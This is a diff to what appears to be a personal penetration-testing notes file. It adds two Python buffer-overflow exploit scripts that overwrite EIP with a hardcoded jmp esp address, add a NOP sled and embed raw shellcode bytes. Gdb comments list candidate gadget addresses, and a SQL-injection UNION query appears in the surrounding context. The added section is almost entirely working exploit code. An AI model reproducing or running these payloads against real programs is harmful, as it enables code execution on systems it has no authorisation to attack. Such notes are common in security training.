@@ -336,7 +336,56 @@ UNION SELECT TABLE_CATALOg,TABLE_SCHEMA,TABLE_NAME FROM information.schema.table
 - copy shell code into script
 - add (+buf into print statment) 
 ```
+## Example Scripts
+```
+#!/usr/bin/env python
 
+buffer = "A" * 62
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+buf =  b""
+buf += b"\xdb\xc6\xb8\xaa\x49\x42\x92\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x0b\x83\xc3\x04\x31\x43\x15\x03\x43"
+buf += b"\x15\x48\xbc\x28\x99\xd4\xa6\xff\xfb\x8c\xf5\x9c"
+buf += b"\x8a\xab\x6e\x4c\xfe\x5b\x6f\xfa\x2f\xf9\x06\x94"
+buf += b"\xa6\x1e\x8a\x80\xbe\xe0\x2b\x51\xb6\x88\x44\x30"
+buf += b"\x55\x21\x9b\xe5\xf6\x38\x7a\xc4\x79"
+print (buffer+eip+nop+buf)
+# find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after stack line, last hex value in stack line 
+# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
+# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
+# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
+# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"
+-----------------------------------------------------------------------------------------------------------
+
+#!/usr/bin/env python 
+
+buffer = "A" * 76
+
+eip = "\x59\x3b\xde\xf7"
+
+nop = "\x90" * 15
+
+buf =  b""
+buf += b"\xb8\x9d\x92\xd0\xec\xd9\xc7\xd9\x74\x24\xf4\x5e"
+buf += b"\x2b\xc9\xb1\x0b\x31\x46\x14\x83\xc6\x04\x03\x46"
+buf += b"\x10\x7f\x67\xba\xe7\x27\x11\x69\x9e\xbf\x0c\xed"
+buf += b"\xd7\xd8\x27\xde\x94\x4e\xb8\x48\x74\xec\xd1\xe6"
+buf += b"\x03\x13\x73\x1f\x14\xd3\x74\xdf\x6c\xbb\x1b\xbe"
+buf += b"\xff\x52\xe4\x17\x53\x2d\x05\x5a\xd3"
+print(buffer+eip+nop+buf)
+# find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
+# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
+# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
+# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"
+
+#comrade 
+#0xf7df1b51 0xf7 df 1b 51 "\x5\x1b\xdf\xf7"
+#0xf7f6674b
+#0xf7f72753
+#0xf7f72c6b
+```
 
 
 
